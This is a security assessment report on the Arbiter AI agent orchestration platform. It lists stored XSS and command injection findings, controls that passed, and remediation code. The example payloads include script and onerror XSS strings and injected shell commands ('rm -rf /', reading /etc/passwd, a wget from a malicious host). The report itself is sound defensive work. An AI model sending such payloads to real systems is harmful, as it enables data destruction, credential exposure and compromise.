# Arbiter Security Assessment Report

## Executive Summary

A comprehensive security assessment was conducted on the Arbiter AI agent orchestration platform. The assessment identified several critical security vulnerabilities that require immediate attention, particularly around input sanitization and validation.

## Critical Vulnerabilities Identified

### 1. Cross-Site Scripting (XSS) Vulnerability - HIGH RISK

**Description**: The API does not sanitize HTML/JavaScript content in agent configurations, allowing XSS payloads to be stored and potentially executed.

**Affected Endpoints**:
- `POST /api/agents` - Agent creation
- `PUT /api/agents/:id` - Agent updates
- `POST /api/workflows` - Workflow creation

**Example Payload**:
```javascript
{
  "id": "malicious-agent",
  "name": "<script>alert('XSS')</script>",
  "description": "<img src='x' onerror='alert(1)'>",
  "systemPrompt": "javascript:alert('XSS')"
}
```

**Impact**: 
- Stored XSS attacks affecting users viewing agent configurations
- Potential session hijacking and privilege escalation
- Client-side code execution in the frontend application

**Recommendation**: Implement HTML sanitization using libraries like DOMPurify or html-sanitize before storing user input.

### 2. Command Injection Vulnerability - HIGH RISK

**Description**: The API does not sanitize command injection patterns in agent execution data, potentially allowing execution of arbitrary system commands.

**Affected Endpoints**:
- `POST /api/agents/:id/execute` - Agent execution

**Example Payload**:
```javascript
{
  "input": {
    "message": "; rm -rf /",
    "command": "| cat /etc/passwd",
    "file": "&& wget malicious.com/script.sh"
  }
}
```

**Impact**:
- Arbitrary command execution on the server
- Data exfiltration and system compromise
- Denial of service attacks

**Recommendation**: Implement strict input validation and command sanitization. Use parameterized queries and avoid shell command execution where possible.

## Medium Risk Vulnerabilities

### 3. Information Disclosure in Error Messages

**Description**: Some error responses may not consistently format error messages, potentially exposing system information.

**Impact**: Limited information disclosure that could aid further attacks.

**Recommendation**: Standardize error message formatting and ensure no sensitive system information is exposed.

## Security Controls Working Correctly

### ✅ SQL Injection Protection
- API correctly handles SQL injection attempts in URL parameters
- Malicious agent IDs are properly rejected or sanitized

### ✅ Path Traversal Protection  
- Directory traversal attempts are properly blocked
- Encoded path traversal patterns are handled correctly

### ✅ JSON Payload Protection
- Deep JSON objects (JSON bombs) are handled appropriately
- Large payloads are rejected with proper HTTP status codes
- Malformed JSON is rejected gracefully

### ✅ Rate Limiting Tolerance
- API handles rapid consecutive requests without crashing
- Large payloads are handled within configured limits

### ✅ Input Validation Framework
- Agent and workflow configuration validation is working
- Required field validation is enforced
- Data type validation is properly implemented

### ✅ Content-Type Validation
- Non-JSON content types are properly rejected
- Malformed JSON payloads return appropriate error codes

## Recommendations by Priority

### Immediate (Critical - Fix within 24 hours)

1. **Implement XSS Protection**
   ```javascript
   // Add to middleware or validation layer
   const DOMPurify = require('dompurify');
   const { JSDOM } = require('jsdom');
   
   const window = new JSDOM('').window;
   const purify = DOMPurify(window);
   
   function sanitizeInput(input) {
     if (typeof input === 'string') {
       return purify.sanitize(input);
     }
     return input;
   }
   ```

2. **Implement Command Injection Protection**
   ```javascript
   function sanitizeCommand(input) {
     // Remove or escape dangerous characters
     const dangerous = /[;&|`$(){}[\]<>]/g;
     return input.replace(dangerous, '');
   }
   ```

### Short Term (Within 1 week)

3. **Add Input Sanitization Middleware**
   - Create middleware to sanitize all incoming request data
   - Apply to all routes handling user input

4. **Implement Content Security Policy (CSP)**
   - Add CSP headers to prevent XSS execution
   - Configure strict CSP rules for the frontend

5. **Add Request Rate Limiting**
   - Implement rate limiting to prevent DoS attacks
   - Add request size limits

### Medium Term (Within 1 month)

6. **Security Testing Integration**
   - Add automated security tests to CI/CD pipeline
   - Implement security linting rules

7. **Audit Logging**
   - Log all security-relevant events
   - Monitor for attack patterns

8. **Security Headers**
   - Implement security headers (HSTS, X-Frame-Options, etc.)
   - Add CORS configuration

## Testing Results Summary

- **Total Tests**: 19 security tests
- **Passed**: 16 tests
- **Failed**: 3 tests (2 critical vulnerabilities, 1 minor issue)
- **Security Controls Working**: 13/16 (81%)
- **Critical Issues**: 2

## Next Steps

1. Address critical XSS and command injection vulnerabilities immediately
2. Implement recommended security controls
3. Re-run security tests to verify fixes
4. Consider professional security audit for production deployment
5. Establish ongoing security monitoring and testing procedures

## Test Coverage
